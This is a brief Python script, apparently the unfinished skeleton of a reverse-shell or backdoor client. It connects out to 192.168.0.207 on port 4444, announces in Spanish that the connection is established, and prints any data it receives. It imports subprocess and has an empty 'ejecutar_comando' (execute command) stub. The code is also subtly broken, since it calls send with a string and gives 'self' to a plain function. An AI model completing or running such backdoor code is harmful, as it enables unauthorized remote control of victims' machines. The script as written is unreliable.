import socket 
import subprocess

def ejecutar_comando(self):
    return

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.0.207", 4444))

connection.send("\n [+]Conexion establecida\n")

datos_recividos = connection.recv(1024)
print(datos_recividos)

connection.close()